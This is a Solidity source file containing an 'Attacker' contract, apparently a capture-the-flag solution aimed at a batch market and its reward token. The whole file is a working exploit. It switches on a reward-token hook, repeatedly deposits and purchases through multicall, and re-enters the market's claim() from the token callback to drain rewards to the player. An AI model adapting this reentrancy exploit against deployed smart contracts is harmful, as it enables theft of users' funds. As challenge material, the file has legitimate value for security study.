// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface ICreditToken {
    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);
}

interface IRewardToken {
    function balanceOf(address account) external view returns (uint256);

    function setHook(bool enabled) external;

    function transfer(address to, uint256 amount) external;
}

interface IBatchMarket {
    function deposit(uint256 amount) external;

    function multicall(bytes[] calldata data) external;

    function purchase(uint256 amount) external;

    function claim() external;
}

interface ISetup {
    function credit() external view returns (address);

    function reward() external view returns (address);

    function market() external view returns (address);
}

contract Attacker {
    ICreditToken public immutable credit;
    IRewardToken public immutable reward;
    IBatchMarket public immutable market;
    address public immutable player;

    constructor(address setupAddress) {
        ISetup setup = ISetup(setupAddress);
        credit = ICreditToken(setup.credit());
        reward = IRewardToken(setup.reward());
        market = IBatchMarket(setup.market());
        player = msg.sender;
    }

    function attack() external {
        require(msg.sender == player, "only player");

        reward.setHook(true);
        for (uint256 i; i < 7; ++i) {
            uint256 amount = credit.balanceOf(address(this));
            credit.approve(address(market), amount);
            market.deposit(amount);

            bytes[] memory calls = new bytes[](1);
            calls[0] = abi.encodeCall(IBatchMarket.purchase, (amount));
            market.multicall(calls);
        }
        reward.setHook(false);
        reward.transfer(player, reward.balanceOf(address(this)));
    }

    function onRewardReceived() external {
        require(msg.sender == address(reward), "only reward token");
        market.claim();
    }
}
